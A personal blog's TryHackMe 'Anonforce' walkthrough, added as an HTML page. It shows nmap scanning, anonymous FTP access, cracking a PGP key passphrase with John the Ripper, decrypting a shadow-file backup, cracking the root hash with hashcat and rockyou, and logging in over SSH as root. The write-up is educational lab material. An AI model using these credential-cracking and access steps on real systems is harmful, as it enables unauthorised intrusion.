@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" href="/style.css">
+        <title>about - christopher di-nozzi</title>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta
+            name="description"
+            content="A page generated using ssg. Probably a blog post.">
+    </head>
+    <div id="header">
+   <h1> <a href="/">christopher di-nozzi</a></h1>
+    <nav>
+        <a href="/about">about</a>
+        <span>|</span>
+        <a href="/projects">projects</a>
+        <span>|</span>
+        <a href="/blog">blog</a>
+    </nav>
+    <hr>
+    </div>
+    <div id="main">
+<h1>TryHackMe Walkthrough - Anonforce</h1>
+
+<h3>PGP? GPG? PGGPPGG?</h3>
+
+<p>12/01/2021</p>
+
+<p>Now that I have some time off of university, I thought I’d try and get some old TryHackMe rooms done. I decided to start off easy and work my way up, so lets give “Anonforce” a go!</p>
+
+<h2>Enumeration</h2>
+
+<p>I started off a with nice and easy nmap scan. I scanned all the ports (just in case) and threw the “-sV” flag on there for good measure. The scan didn’t take too long but it wasn’t incredibly exciting.</p>
+
+<p><code>
+PORT STATE SERVICE VERSION <br />
+21/tcp open ftp vsftpd 3.0.3 <br />
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) <br />
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel
+</code></p>
+
+<h3>User Flag</h3>
+
+<p>Lets give the FTP server a shot. I tried connecting to it using user anonymous and password anonymous, and it worked a treat!  </p>
+
+<p><code>
+ftp 10.10.42.70 <br />
+Connected to 10.10.42.70. <br />
+220 (vsFTPd 3.0.3) <br />
+Name (10.10.42.70:chris): anonymous <br />
+331 Please specify the password. <br />
+Password: <br />
+230 Login successful. <br />
+Remote system type is UNIX. <br />
+Using binary mode to transfer files. <br />
+ftp&gt;
+</code></p>
+
+<p>From here, I moved into the home directory and found the home folder of the user “melodias”. Moving into that directory, I found the user flag! I use the “get” command to download it and opened it up on my local machine! Easy peasy! One flag down, one to go!</p>
+
+<h3>Root Flag</h3>
+
+<p>Now for the root flag. After snooping around for a bit I noticed a folder in the root directory called “notread”.</p>
+
+<p><code>
+ftp&gt; ls <br />
+200 PORT command successful. Consider using PASV. <br />
+150 Here comes the directory listing. <br />
+drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin <br />
+drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot <br />
+drwxr-xr-x 17 0 0 3700 Jan 12 03:41 dev <br />
+drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc <br />
+drwxr-xr-x 3 0 0 4096 Aug 11 2019 home <br />
+lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -&gt; boot/initrd.img-4.4.0-157-generic <br />
+lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -&gt; boot/initrd.img-4.4.0-142-generic <br />
+drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib <br />
+drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 <br />
+drwx------ 2 0 0 16384 Aug 11 2019 lost+found <br />
+drwxr-xr-x 4 0 0 4096 Aug 11 2019 media <br />
+drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt <br />
+drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread <br />
+drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt <br />
+dr-xr-xr-x 95 0 0 0 Jan 12 03:41 proc <br />
+drwx------ 4 0 0 4096 Jan 12 04:05 root <br />
+drwxr-xr-x 18 0 0 560 Jan 12 04:05 run <br />
+drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin <br />
+drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv <br />
+dr-xr-xr-x 13 0 0 0 Jan 12 03:41 sys <br />
+drwxrwxrwt 9 0 0 4096 Jan 12 03:41 tmp <br />
+drwxr-xr-x 10 0 0 4096 Aug 11 2019 usr <br />
+drwxr-xr-x 11 0 0 4096 Aug 11 2019 var <br />
+lrwxrwxrwx 1 0 0 30 Aug 11 2019 vmlinuz -&gt; boot/vmlinuz-4.4.0-157-generic <br />
+lrwxrwxrwx 1 0 0 30 Aug 11 2019 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-142-generic <br />
+226 Directory send OK.
+</code></p>
+
+<p>Out of respect, I didn’t look into the folder any further. <br />
+Just kidding! <br />
+Moving into it I found two files – “backup.pgp” and “private.asc”. I won’t lie, I didn't know the first thing about PGP or GPG so I had to do some research here. It turns out, we should be able to view the contents of “backup.pgp” using the “private.asc” file as a key! Good stuff! I downloaded both file onto my machine. I started by trying to add the “private.asc” to my key bank using the command:</p>
+
+<p><code>
+gpg --import private.asc
+</code></p>
+
+<p>I was then prompted for a password. I don’t know the password so lets crack it! Using “gpg2john”, a tool that comes with John the Ripper, I was able to turn "private.asc" into a file that john could crack!</p>
+
+<p><code>
+gpg2john private.asc &gt; key
+</code></p>
+
+<p>Then I ran john against my new "key" file. What would you know, it cracked it almost instantly! I used the "--show" flag to view the password.</p>
+
+<p><code>
+john key john key --show
+</code></p>
+
+<p>I could then run the import command again and use the new found password to import the key! Awesome! Now we use GPG to decrypt our other file!</p>
+
+<p><code>
+gpg --decrypt backup.pgp
+</code></p>
+
+<p>This outputted what seemed to be a copy of the “shadow” file from the server, containing a hash of the root password! This should be simple enough to crack! I move the hash into a file called "root.hash", and using hashcat and the rockyou.txt wordlist, made quick work of it!</p>
+
+<p><code>
+hashcat -a 0 -m 1800 root.hash /usr/share/wordlists/rockyou.txt
+</code></p>
+
+<p>After a few moments I had the root password! I could use this password to SSH as root onto the server and grab the flag!</p>
+
+<p><code>
+ssh root@IP cat root.txt
+</code></p>
+
+<h3>Conclusion</h3>
+
+<p>Overall this room was quite straightforward! The only challenge I had was with the PGP/GPG keys as I’ve never used them before! If you’re familiar with them I think you’d breeze through this room no problem!</p>
+</div>
+    <hr>
+    <footer>
+        <nav>
+            <a href="https://twitter.com/chris_dinozzi">twitter</a>
+            <span>|</span>
+            <a href="https://unsplash.com/@chrisdinozzi">photos</a>
+            <span>|</span>
+            <a href="https://github.com/chrisdinozzi">github</a>
+        </nav>
+    </footer>
+</html>
